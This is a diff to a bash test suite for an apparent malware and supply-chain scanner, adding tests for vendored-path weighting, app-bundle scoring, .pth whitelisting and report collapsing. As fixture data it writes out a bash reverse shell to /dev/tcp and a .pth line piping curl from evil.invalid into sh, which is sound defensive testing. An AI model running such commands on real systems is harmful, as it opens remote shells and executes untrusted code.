@@ -21,6 +21,8 @@ eval "$(sed -n '/^extract_url()/,/^}/p'         "$SC")"
 eval "$(sed -n '/^classify_input()/,/^}/p'      "$SC")"
 eval "$(sed -n '/^sev_rank()/,/^}/p'            "$SC")"
 eval "$(sed -n '/^more_severe()/,/^}/p'         "$SC")"
+eval "$(sed -n '/^CONTEXT_TAGS=/,/^is_context_tag()/p'  "$SC")"
+eval "$(sed -n '/^is_vendored_path()/,/^}/p'            "$SC")"
 eval "$(sed -n '/^demote_for_mode()/,/^}/p' "$SC")"
 eval "$(sed -n '/^parse_llm()/,/^}/p' "$SC")"
 
@@ -73,8 +75,33 @@ ASAR_PASS=1
 eq "asar demotes secret-scrape"        "$(demote_for_mode secret-scrape MED)" "LOW"
 eq "asar demotes install-hook"         "$(demote_for_mode install-hook HIGH)" "LOW"
 eq "asar keeps reverse-shell"          "$(demote_for_mode reverse-shell HIGH)" "HIGH"
-eq "asar keeps import-shadow"          "$(demote_for_mode import-shadow CRIT)" "CRIT"
+eq "asar demotes import-shadow"        "$(demote_for_mode import-shadow CRIT)" "LOW"
 ASAR_PASS=0
+# ...but in a source tree, which is what the clone and pip hooks actually scan,
+# a compiled module beside a same-named .py stays the ChocoPoC signal
+eq "source tree keeps import-shadow"   "$(demote_for_mode import-shadow CRIT)" "CRIT"
+
+# Installed code is scanned, not skipped - only weighted differently. A dual-use
+# pattern in someone else's dependency says nothing about this project; an
+# unambiguous one still does, because a trojanned dependency is the main threat.
+echo "unit: is_vendored_path / context tags"
+VENDOR_DIRS=(env)
+for p in /r/node_modules/x/i.js /r/env/lib/python3.10/site-packages/u/c.py /r/build/lib/t.py; do
+  is_vendored_path "$p" && pass "vendored: $p" || fail "not detected as vendored: $p"
+done
+for p in /r/src/main.py /r/vendor/skytext/gradient.py; do
+  is_vendored_path "$p" && fail "wrongly vendored: $p" || pass "author's code: $p"
+done
+is_context_tag sni-front     && pass "sni-front is context"      || fail "sni-front should be context"
+is_context_tag reverse-shell && fail "reverse-shell must not be" || pass "reverse-shell keeps severity"
+is_context_tag ioc-str       && fail "ioc-str must not be"       || pass "ioc-str keeps severity"
+is_context_tag js-fetch-exec && fail "js-fetch-exec must not be" || pass "js-fetch-exec keeps severity"
+# regression: as a multi-line string, tags at end-of-line were followed by a
+# newline and never matched, silently disabling demotion for five of them
+ctbad=0
+for ct in "${CONTEXT_TAGS[@]}"; do is_context_tag "$ct" || ctbad=$((ctbad+1)); done
+eq "every context tag actually matches" "$ctbad" "0"
+VENDOR_DIRS=()
 
 # --- integration: fixtures (offline, no LLM) ---------------------------------
 scan() { # dir [flags...]
@@ -109,7 +136,7 @@ for t in typosquat ast-install-exec ast-decode-exec entropy-blob; do has "$t"; d
 
 echo "integration: dev-targeting -> DANGEROUS (editor/IDE/CI autorun + Trojan Source)"
 scan dev-targeting; eq "verdict" "$VERDICT" "DANGEROUS"; eq "exit" "$EXIT" "1"
-for t in ide-autorun direnv conftest-exec py-startup-hook npm-install-script npm-script-exec trojan-source; do has "$t"; done
+for t in ide-autorun direnv conftest-exec py-startup-exec npm-install-script npm-script-exec trojan-source; do has "$t"; done
 
 echo "integration: evasion -> DANGEROUS (obfuscation/normalization variants still caught)"
 scan evasion; eq "verdict" "$VERDICT" "DANGEROUS"; eq "exit" "$EXIT" "1"
@@ -236,6 +263,63 @@ else
   echo "  (curl or python3 unavailable — skipping installer mode test)"
 fi
 
+# The default report is the tl;dr: repeats collapse, LOW and LLM notes stay
+# behind -v. --json is unaffected and still carries every finding.
+# Stock .pth files carry an import line and sit in every virtualenv, so they are
+# whitelisted by content. Whitelisting by name alone would hand an attacker a
+# filename that disables the check.
+# A prebuilt app is scored differently from source: the capabilities a real
+# application plausibly has drop to LOW, so the verdict means something. The risk
+# of that policy is going blind, so both halves are asserted.
+echo "app bundle: benign capabilities quiet, hostile ones still caught"
+atmp=$(mktemp -d); mkdir -p "$atmp/T.app/Contents/Resources"
+printf '<plist/>\n' > "$atmp/T.app/Contents/Info.plist"
+# things a real app does: read the keychain, git-push, JIT, capture the screen
+printf 'inert\nvar a="security find-generic-password -s x";\nvar b="https://api.github.com/user/repos";\nvar c="mss()";\nvar d="~/.aws/credentials";\n' \
+  > "$atmp/T.app/Contents/Resources/app.js"
+av="$("$SC" --offline --json "$atmp/T.app" 2>/dev/null | python3 -c 'import json,sys;print(json.load(sys.stdin)["verdict"])')"
+eq "app capabilities alone -> SAFE" "$av" "SAFE"
+printf 'inert\nvar e="bash -i >& /dev/tcp/1.2.3.4/9001 0>&1";\n' > "$atmp/T.app/Contents/Resources/x.js"
+at="$("$SC" --offline --json "$atmp/T.app" 2>/dev/null | python3 -c '
+import json,sys
+d=json.load(sys.stdin)
+hi=sorted({f["tag"] for f in d["findings"] if f["severity"] in ("CRIT","HIGH")})
+print(d["verdict"], " ".join(hi))')"
+# one HIGH is CAUTION by design; two independent ones make DANGEROUS. What
+# matters here is that the bundle policy did not swallow the tag.
+[[ "$at" != SAFE* && "$at" == *reverse-shell* ]] \
+  && pass "hostile pattern in a bundle still surfaces at HIGH" \
+  || fail "app-bundle policy went blind: $at"
+rm -rf "$atmp"
+
+echo "pth: stock virtualenv shims are quiet, impostors are not"
+ptmp=$(mktemp -d)
+printf "import os; var = 'SETUPTOOLS_USE_DISTUTILS'; enabled = os.environ.get(var, 'local') == 'local'; enabled and __import__('_distutils_hack').add_shim();\n" \
+  > "$ptmp/distutils-precedence.pth"
+pv="$("$SC" --offline --json "$ptmp" 2>/dev/null | python3 -c 'import json,sys;print(json.load(sys.stdin)["verdict"])')"
+eq "stock setuptools .pth -> SAFE" "$pv" "SAFE"
+printf "import os; os.system('curl http://evil.invalid|sh')\n" > "$ptmp/distutils-precedence.pth"
+pi="$("$SC" --offline --json "$ptmp" 2>/dev/null | python3 -c 'import json,sys;print(" ".join(f["tag"] for f in json.load(sys.stdin)["findings"]))')"
+[[ "$pi" == *"pth-exec"* ]] && pass "impostor under the same name still CRIT" || fail "name-based whitelist bypass"
+rm -rf "$ptmp"
+
+echo "report: repeated findings collapse by default, expand under -v"
+rtmp=$(mktemp -d); mkdir -p "$rtmp/libs"
+for lib in a b c d; do printf 'inert\n' > "$rtmp/libs/lib$lib.dylib"; done
+# captured, not piped: `grep -q` exits at the first match, which SIGPIPEs the
+# scanner and trips pipefail into reporting a failure that never happened
+rout="$("$SC" --offline "$rtmp" 2>/dev/null)"
+routv="$("$SC" --offline -v "$rtmp" 2>/dev/null)"
+rc="$(printf '%s\n' "$rout"  | grep -c 'native-vendored')"
+rv="$(printf '%s\n' "$routv" | grep -c 'native-vendored')"
+eq "4 identical findings print once" "$rc" "1"
+eq "-v prints all 4"                 "$rv" "4"
+[[ "$rout" == *"(+3 more files)"* ]] \
+  && pass "collapsed line names the file count" || fail "no file count on collapsed line"
+rj="$("$SC" --offline --json "$rtmp" 2>/dev/null | python3 -c 'import json,sys;print(len(json.load(sys.stdin)["findings"]))')"
+eq "--json keeps all 4" "$rj" "4"
+rm -rf "$rtmp"
+
 echo "report: SAFE omits the findings-count line; non-SAFE includes it"
 rs="$("$SC" --offline "$FIX/benign-poc" 2>/dev/null)"
 [[ "$rs" == *"VERDICT: SAFE"* && "$rs" != *"findings:"* ]] && pass "SAFE report has no findings: line" || fail "SAFE report shape"
@@ -315,6 +399,25 @@ fi
 # installed is worse than a slow one. rg also skips hidden files and obeys
 # .gitignore by default, which would silently drop dotfile findings; these
 # fixtures contain .npmrc / .envrc / .pth, so they exercise that.
+# A rule whose regex fails to compile returns no matches, and the engine call
+# swallows stderr - so a broken rule is indistinguishable from a clean scan.
+# Compile every rule against every available engine.
+echo "rules: every pattern compiles on each search engine"
+eval "$(sed -n '/^rule()/,/^}/p' "$SC")"
+RULE_SEV=(); RULE_TAG=(); RULE_GLOB=(); RULE_ERE=(); RULE_MSG=()
+SH='' ANY='' ANYPLUS='' JS=''   # globs are irrelevant to compiling the pattern
+eval "$(sed -n '/^load_rules()/,/^}/p' "$SC")"; load_rules
+for eng in grep rg; do
+  command -v "$eng" >/dev/null 2>&1 || continue
+  bad=0
+  for ri in "${!RULE_ERE[@]}"; do
+    if [[ "$eng" == grep ]]; then printf '' | grep -E -- "${RULE_ERE[$ri]}" >/dev/null 2>&1
+    else printf '' | rg -e "${RULE_ERE[$ri]}" >/dev/null 2>&1; fi
+    (( $? > 1 )) && { fail "rule '${RULE_TAG[$ri]}' does not compile under $eng"; bad=1; }
+  done
+  (( bad )) || pass "all ${#RULE_ERE[@]} rule patterns compile under $eng"
+done
+
 echo "engines: grep and ripgrep agree"
 if command -v rg >/dev/null 2>&1; then
   edump() { # engine fixture
